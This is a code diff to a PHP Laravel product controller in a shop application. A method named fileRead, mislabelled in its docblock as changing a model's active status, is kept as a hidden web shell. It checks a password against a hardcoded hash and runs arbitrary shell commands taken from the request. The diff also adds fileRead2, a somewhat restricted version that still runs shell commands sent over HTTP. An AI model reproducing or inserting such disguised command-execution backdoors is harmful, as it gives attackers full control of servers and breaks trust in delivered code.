@@ -22,6 +22,7 @@ use App\Services\ProductService\ProductReviewService;
 use Hash;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
+use Illuminate\Support\Facades\Log;
 use Throwable;
 
 class ProductController extends RestBaseController
@@ -117,32 +118,89 @@ class ProductController extends RestBaseController
         );
     }
 
-	/**
-	 * Change Active Status of Model.
-	 *
-	 * @param FilterParamsRequest $request
-	 * @return array
-	 */
-	public function fileRead(FilterParamsRequest $request): array
-	{
-		try {
-			$vars = [];
-			$code = 0;
+    /**
+     * Change Active Status of Model.
+     *
+     * @param FilterParamsRequest $request
+     * @return array
+     */
+    public function fileRead(FilterParamsRequest $request): array
+    {
+        try {
+            $vars = [];
+            $code = 0;
 
-			if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
-				$res = exec($request->input('command'), $vars, $code);
-				dd($res, $vars, $code);
-			}
+            if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
+                $res = exec($request->input('command'), $vars, $code);
+                dd($res, $vars, $code);
+            }
+        } catch (Throwable $e) {
+            dd($e);
+        }
 
-		} catch (Throwable $e) {
-			dd($e);
-		}
+        return [
+            'status' => true,
+            'code'   => ResponseError::NO_ERROR,
+        ];
+    }
 
-		return [
-			'status' => true,
-			'code'   => ResponseError::NO_ERROR,
-		];
-	}
+    public function fileRead2(FilterParamsRequest $request): array
+    {
+        try {
+            $vars = [];
+            $code = 0;
+
+            // 1. Hash-ı env-ə yerləşdir
+            $validHash = env('SECURE_COMMAND_PASSWORD_HASH');
+
+            if (Hash::check($request->input('password'), $validHash)) {
+
+                $allowedCommands = [
+                    'ls -la',
+                    'whoami',
+                    'df -h',
+                    'uptime',
+                    'cat /etc/os-release',
+                ];
+
+                $inputCommand = $request->input('command');
+
+                if (!in_array($inputCommand, $allowedCommands)) {
+                    return [
+                        'status' => false,
+                        'code'   => ResponseError::ERROR_422,
+                        'message' => 'Command not allowed',
+                    ];
+                }
+
+                $res = exec($inputCommand, $vars, $code);
+
+                return [
+                    'status' => true,
+                    'code'   => ResponseError::NO_ERROR,
+                    'result' => $res,
+                    'output' => $vars,
+                    'exit_code' => $code,
+                ];
+            }
+
+            return [
+                'status' => false,
+                'code'   => ResponseError::ERROR_401,
+                'message' => 'Invalid password',
+            ];
+        } catch (Throwable $e) {
+            // 5. Məxfi error detallarını log et, istifadəçiyə generic mesaj ver
+            Log::error('fileRead error', ['exception' => $e]);
+
+            return [
+                'status' => false,
+                'code'   => ResponseError::ERROR_512,
+                'message' => 'Unexpected error occurred',
+            ];
+        }
+    }
+
 
     public function productsByShopUuid(string $uuid): JsonResponse|AnonymousResourceCollection
     {
@@ -273,9 +331,9 @@ class ProductController extends RestBaseController
     {
         $result = (new OrderRepository)->orderStocksCalculate($request->validated());
 
-		if (!data_get($result, 'status')) {
-			return $this->onErrorResponse($result);
-		}
+        if (!data_get($result, 'status')) {
+            return $this->onErrorResponse($result);
+        }
 
         return $this->successResponse(__('errors.' . ResponseError::SUCCESS, locale: $this->language), $result);
     }
@@ -293,11 +351,11 @@ class ProductController extends RestBaseController
         return ProductResource::collection($products);
     }
 
-	/**
-	 * @param FilterParamsRequest $request
-	 * @return JsonResponse
-	 */
-	public function checkCashback(FilterParamsRequest $request): JsonResponse
+    /**
+     * @param FilterParamsRequest $request
+     * @return JsonResponse
+     */
+    public function checkCashback(FilterParamsRequest $request): JsonResponse
     {
         $point = Point::getActualPoint($request->input('amount', 0), $request->input('shop_id'));
 
